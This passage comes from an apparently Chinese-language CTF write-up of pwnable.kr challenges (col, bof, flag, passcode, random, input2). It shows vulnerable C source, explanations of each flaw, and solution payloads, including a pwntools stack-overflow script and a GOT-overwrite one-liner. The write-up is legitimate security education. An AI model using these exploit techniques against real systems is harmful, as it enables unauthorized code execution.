<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>check_password</code>将<code>char*</code>强制转换为<code>int*</code>，也就是将输入的数据分为4个字节一组，5组数据相加最后的结果要等于<code>0x21DD09EC</code></p>
<p><code>0x21DD09EC/5 = 0x6C5CEC9 * 4 + 0x6C5CEC8​</code></p>
<p><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./col `python -c <span class="string">'print "\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC8\xCE\xC5\x06"'</span>`</span><br></pre></td></tr></table></figure>
<h2 id="bof">bof</h2>
<h3 id="题目描述-2">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-2">题目解析</h3>
<p>很明显的栈溢出，将key的值覆盖为<code>0xCAFEBABE</code>就可以了</p>
<p><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"pwnable.kr"</span>,<span class="number">9000</span>)</span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">52</span></span><br><span class="line">payload+=p64(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="flag">flag</h2>
<h3 id="题目描述-3">题目描述</h3>
<p>虽然在pwnable上面，但是是一道逆向题</p>
<p>Papa brought me a packed present! let's open it.</p>
<p>Download : http://pwnable.kr/bin/flag</p>
<p>This is reversing task. all you need is binary</p>
<h3 id="题目解析-3">题目解析</h3>
<p>刚拿到就直接放进了ida中，结果只显示4个函数，并且有的还无法F5。后来看了wp才知道程序被upx压缩过了</p>
<p><code>upx -d flag</code>解压缩，ida分析程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>((__int64)<span class="string">"I will malloc() and strcpy the flag there. take it."</span>);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100L</span>L);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>非常简单的逻辑，把flag复制到dest中，查看flag处的数据即可</p>
<h2 id="passcode">passcode</h2>
<h3 id="题目描述-4">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> passcode1;</span><br><span class="line">        <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">        <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">        welcome();</span><br><span class="line">        login();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// something after login...</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-4">题目解析</h3>
<p>login函数中的两个scanf的参数没有加&amp;，但是scanf依然会把passcode1和passcode2当成指针来存储数据，也就是说此时输入的数据应该在passcode1和passcode2中的值所指向的地址里面。</p>
<p>如果将passcode1或passcode2里面的值覆盖为某个函数的地址，构造好栈的布局，参数为<code>system("/bin/cat flag")</code>的地址，那么scanf就会将<code>system("/bin/cat flag")</code>的地址覆盖到原本的函数地址上去，然后得到flag。</p>
<p>接下来就需要计算name到passcode的长度</p>
<p>gdb反汇编分析，只看关键部分</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">welcome:</span><br><span class="line"> 0x0804862f &lt;+38&gt;:    lea    -0x70(%ebp),%edx	;name的地址</span><br><span class="line"> 0x08048632 &lt;+41&gt;:    mov    %edx,0x4(%esp)</span><br><span class="line"> 0x08048636 &lt;+45&gt;:    mov    %eax,(%esp)</span><br><span class="line"> 0x08048639 &lt;+48&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login:</span><br><span class="line">passcode1:</span><br><span class="line"> 0x0804857c &lt;+24&gt;:    mov    -0x10(%ebp),%edx	;passcode1的地址</span><br><span class="line"> 0x0804857f &lt;+27&gt;:    mov    %edx,0x4(%esp)</span><br><span class="line"> 0x08048583 &lt;+31&gt;:    mov    %eax,(%esp)</span><br><span class="line"> 0x08048586 &lt;+34&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">passcode2:</span><br><span class="line"> 0x080485aa &lt;+70&gt;:    mov    -0xc(%ebp),%edx	;passcode2的地址</span><br><span class="line"> 0x080485ad &lt;+73&gt;:    mov    %edx,0x4(%esp)</span><br><span class="line"> 0x080485b1 &lt;+77&gt;:    mov    %eax,(%esp)</span><br><span class="line"> 0x080485b4 &lt;+80&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">system_getflag:</span><br><span class="line"> 0x080485e3 &lt;+127&gt;:   movl   $0x80487af,(%esp)</span><br><span class="line"> 0x080485ea &lt;+134&gt;:   call   0x8048460 &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>
<p>通过计算可知，name到passcode1的长度为96字节，name的长度为100，刚好可以溢出覆盖passcode1。</p>
<p>接着查看plt表，因为只够覆盖到passcode1，所以选择fflush函数</p>
<p><strong>payload</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | ./passcode</span><br></pre></td></tr></table></figure>
<h2 id="random">random</h2>
<h3 id="题目描述-5">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">	random = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-5">题目解析</h3>
<p>观察代码，令<code>key^random</code>的值等于<code>0xdeadbeef</code>就可以得到flag。刚开始以为是栈溢出，但是<code>scanf("%d",&amp;key)</code>只会读取4个字节，不够覆盖random。</p>
<p>调试了几次发现random每次的值都一样，那么只需要将<code>0xdeadbeef</code>与random异或就可以得到key的值，最后输入key的时候要先把key转为10进制，因为scanf的格式化字符串是%d。</p>
<blockquote>
<p>关于为什么random每次的值都一样</p>
<p>rand<a href="https://baike.baidu.com/item/函数" target="_blank" rel="noopener">函数</a>不是真正的随机数生成器，而srand()会设置供rand()使用的随机数种子。如果你在第一次调用rand()之前没有调用srand()，那么系统会为你自动调用srand()。如果用户在此之前没有调用过srand(seed)，它会自动调用srand(1)一次。而使用同种子相同的数调用 rand()会导致相同的<a href="https://baike.baidu.com/item/随机" target="_blank" rel="noopener">随机</a>数序列被生成。</p>
</blockquote>
<h2 id="input2">input2</h2>
<h3 id="题目描述-6">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// argv</span></span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// stdio</span></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// env</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// file</span></span><br><span class="line">	FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// network</span></span><br><span class="line">	<span class="keyword">int</span> sd, cd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line">	<span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">	cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// here's your flag</span></span><br><span class="line">	system(<span class="string">"/bin/cat flag"</span>);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目总共有五关，需要依次通过，pwntools完美解决。</p>
<h3 id="题目解析-6">题目解析</h3>
<h4 id="stage-1-argv">stage 1 argv</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
<p>第一关要求给出100个参数，并且第’A'（65）个和第'B'（66）个分别是<code>\x00</code>和<code>\x20\x0a\x0d</code>。</p>
<p>构造list，一般情况，argv[0]是<code>"./input"</code>，也就是程序名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">argv = list(<span class="string">'1'</span> * <span class="number">100</span>)</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">"./input"</span></span><br><span class="line">argv[ord(<span class="string">'A'</span>)] = <span class="string">"\x00"</span></span><br><span class="line">argv[ord(<span class="string">'B'</span>)] = <span class="string">"\x20\x0a\x0d"</span></span><br></pre></td></tr></table></figure>
<h4 id="stage-2-stdio">stage 2 stdio</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
<p>第一个<code>memcmp</code>从stdin中读取数据，与<code>\x00\x0a\x00\xff</code>进行对比，第二个<code>memcmp</code>从stderr中读取数据进行对比。</p>
<p>pwntools中的process有2个参数，stdin和stderr，传入文件对象即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"stdin.txt"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">"\x00\x0a\x00\xff"</span>)</span><br><span class="line">    file.close()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"stderr.txt"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">"\x00\x0a\x02\xff"</span>)</span><br><span class="line">    file.close()</span><br></pre></td></tr></table></figure>
<h4 id="stage-3-env">stage 3 env</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
<p>依旧使用process中的env参数，env是字典形式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">env = &#123;<span class="string">"\xde\xad\xbe\xef"</span>: <span class="string">"\xca\xfe\xba\xbe"</span>&#125;</span><br></pre></td></tr></table></figure>
<h4 id="stage-4-file">stage 4 file</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
<p>这一关很简单，创建个名字为<code>\x0a</code>的文件，内容为<code>\x00\x00\x00\x00</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"\x0a"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">"\x00\x00\x00\x00"</span>)</span><br><span class="line">    file.close()</span><br></pre></td></tr></table></figure>
<h4 id="stage-5-network">stage 5 network</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line">	<span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">	cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
<p>这一关是建立一个socket来接受数据，与<code>\xde\xad\xbe\xef</code>进行比较。</p>
<p>其中需要注意这两句</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br></pre></td></tr></table></figure>
<p>第一句指定绑定的地址，<code>INADDR_ANY</code>事实上表示不确定地址，或“所有地址”、“任意地址”，<code>127.0.0.1</code>当然也包含在内，第二句指定绑定端口，端口号就是argv['C']的内容，因为argv是我们自己设置的，所以只要设置一个不与其他程序冲突的端口号就行。</p>
<p>直接使用pwntools的remote</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = remote(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>)</span><br><span class="line">r.send(<span class="string">"\xde\xad\xbe\xef"</span>)</span><br></pre></td></tr></table></figure>
<p><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># stage 1 process</span></span><br><span class="line">argv = list(<span class="string">'1'</span> * <span class="number">100</span>)</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">"./input"</span></span><br><span class="line">argv[ord(<span class="string">'A'</span>)] = <span class="string">"\x00"</span></span><br><span class="line">argv[ord(<span class="string">'B'</span>)] = <span class="string">"\x20\x0a\x0d"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stage 2 stdio</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"stdin.txt"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">"\x00\x0a\x00\xff"</span>)</span><br><span class="line">    file.close()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"stderr.txt"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">"\x00\x0a\x02\xff"</span>)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span 